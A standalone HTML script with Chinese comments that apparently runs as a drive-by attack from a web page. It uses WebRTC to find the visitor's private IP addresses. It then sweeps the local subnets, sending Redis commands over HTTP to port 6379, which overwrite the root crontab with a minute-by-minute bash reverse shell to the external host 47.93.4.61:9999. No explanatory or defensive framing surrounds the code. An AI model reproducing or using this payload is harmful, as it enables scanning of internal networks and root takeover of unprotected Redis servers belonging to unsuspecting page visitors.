 <script>
//得到账户关联的IP地址
ipList = []
function getIPs(callback) {
	var ip_dups = {};

	//对Firefox和Chrome兼容
	var RTCPeerConnection = window.RTCPeerConnection
						 || window.mozRTCPeerConnection
						 || window.webkitRTCPeerConnection;

	//绕过对RTC的阻止
	if (!RTCPeerConnection) {
		var iframe = document.createElement('iframe');
		iframe.style.display = 'none';
		document.body.appendChild(iframe);
		var win = iframe.contentWindow;
		window.RTCPeerConnection = win.RTCPeerConnection;
		window.mozRTCPeerConnection = win.mozRTCPeerConnection;
		window.webkitRTCPeerConnection = win.webkitRTCPeerConnection;
		RTCPeerConnection = window.RTCPeerConnection
						 || window.mozRTCPeerConnection
						 || window.webkitRTCPeerConnection;
	}

	//要求最小的数据连接
	var mediaConstraints = {
		optional: [{ RtpDataChannels: true }]
	};

	//Firefox在about:config中设置了默认stun服务器，但在Firefox41中不再默认指定stun地址
	//    media.peerconnection.default_iceservers =
	//    [{"url": "stun:stun.services.mozilla.com"}]
	var servers = { iceServers: [{ urls: "stun:stun.services.mozilla.com" }] };

	//new一个RTCPeerConnection
	var pc = new RTCPeerConnection(servers, mediaConstraints);

	//监听candidate事件
	pc.onicecandidate = function (ice) {

		//跳过非candidate事件
		if (ice.candidate) {

			//匹配IP地址
			var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
			var ip_addr = ip_regex.exec(ice.candidate.candidate)[1];

			//去重
			if (ip_dups[ip_addr] === undefined)
				callback(ip_addr);

			ip_dups[ip_addr] = true;
		}
	};

	//虚构一个数据通道
	pc.createDataChannel("");

	//create an offer sdp
	pc.createOffer(function (result) {

		//触发stun服务器的请求
		pc.setLocalDescription(result, function () { }, function () { });
	}, function () { });
}
 
getIPs(function (ip) {
	var li = document.createElement("li");
	li.textContent = ip;

	
	//本地IP
	if (ip.match(/^(192\.168\.|169\.254\.|10\.|172\.(1[6-9]|2\d|3[01]))/))
	   // document.getElementsByTagName("ul")[0].appendChild(li);
		ipList.push(ip);
		console.log(ip);
		for (var i in ipList){
		if (ipList[i]){
		var iparr = ipList[i].split(".");
		for(var j=0; j<255; j++) {
			 for(var i=1; i<255; i++) {
				var attkip = iparr [0] + "." + iparr [1] + "." + j + "." + i;
				//console.log(attkip);
				send(attkip);
				}
			}
		}
	}
		
});
	
function send(ip) {
	var port= '6379';
	var dir = '/var/spool/cron/';
	var filename = 'root';
	var content = '*/1 * * * * /bin/bash -i >& /dev/tcp/47.93.4.61/9999 0>&1';
	var url = "http://" + ip + ":" + port;
 
	var cmd = new XMLHttpRequest();
	cmd.open("POST",  url);
	cmd.send('eval \'' + 'redis.call(\"set\", \"hacked\", "\\r\\n\\n'+content+'\\n\\n\\n\\n\"); redis.call(\"config\", \"set\", \"dir\", \"' + dir + '/\"); redis.call(\"config\", \"set\", \"dbfilename\", \"'+filename+'\"); ' + '\' 0' + "\r\n");
 
	var cmd = new XMLHttpRequest();
	cmd.open("POST",  url);
	cmd.send('save\r\n');
 
}

	
	</script>
